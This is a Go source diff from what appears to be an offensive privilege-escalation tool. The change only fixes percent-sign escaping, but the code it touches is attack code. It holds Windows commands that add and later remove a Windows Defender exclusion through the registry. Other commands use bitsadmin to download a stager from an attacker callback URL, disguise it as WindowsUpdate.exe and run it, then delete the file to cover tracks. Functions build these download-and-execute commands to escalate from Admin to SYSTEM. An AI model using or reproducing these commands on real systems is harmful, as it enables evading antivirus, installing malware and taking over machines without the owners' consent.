@@ -976,12 +976,12 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			Description:    "Adds exclusion via registry, drops payload, triggers scan",
 			EscalationType: "Admin->System",
 			Commands: []string{
-				`reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%%TEMP%%" /t REG_SZ /d "0" /f`,
-				`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %%TEMP%%\WindowsUpdate.exe`,
+				`reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" /t REG_SZ /d "0" /f`,
+				`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %TEMP%\WindowsUpdate.exe`,
 				`wmic process call create "%%systemroot%%\System32\mpcmdrun.exe -Scan -ScanType QuickScan"`,
 				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
-				`reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%%TEMP%%" /f`,
-				`del "%%TEMP%%\WindowsUpdate.exe"`,
+				`reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" /f`,
+				`del "%TEMP%\WindowsUpdate.exe"`,
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
 			NoiseLevel: "Medium",
@@ -1084,11 +1084,11 @@ func (l *LOLBinEscalation) GenerateSpawnCommand(callbackURL string, targetPriv s
 	// For Admin->System escalation, we need a SIMPLE command that can be wrapped
 	// by the escalation method itself (not pre-wrapped in schtasks)
 	
-	tempFile := `%%TEMP%%\WindowsUpdate.exe`
+	tempFile := `%TEMP%\WindowsUpdate.exe`
 	
 	// Simple download and execute command - NO QUOTES, NO NESTED COMMANDS
 	// This will be wrapped by the escalation method (schtasks, sc, etc.)
-	// Use %% to escape % signs so fmt.Sprintf doesn't interpret them
+	// Return with single % - will be escaped to %% when inserted into templates
 	downloadAndExec := fmt.Sprintf(`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s && start /b "" %s`, callbackURL, tempFile, tempFile)
 	
 	// Return the simple command - the escalation method will wrap it appropriately
@@ -1099,13 +1099,13 @@ func (l *LOLBinEscalation) GenerateSpawnCommand(callbackURL string, targetPriv s
 func (l *LOLBinEscalation) GenerateSpawnFilePath(callbackURL string) string {
 	// Some methods need a file path, not a command
 	// They will download and execute the file themselves
-	return `%%TEMP%%\WindowsUpdate.exe`
+	return `%TEMP%\WindowsUpdate.exe`
 }
 
 // GenerateSpawnCommandForExec generates a command wrapped in cmd.exe /c for execution
 func (l *LOLBinEscalation) GenerateSpawnCommandForExec(callbackURL string, targetPriv string) string {
 	// For methods that need a command wrapped in cmd.exe /c
-	tempFile := `%%TEMP%%\WindowsUpdate.exe`
+	tempFile := `%TEMP%\WindowsUpdate.exe`
 	return fmt.Sprintf(`cmd.exe /c "bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s && start /b "" %s"`, callbackURL, tempFile, tempFile)
 }
 
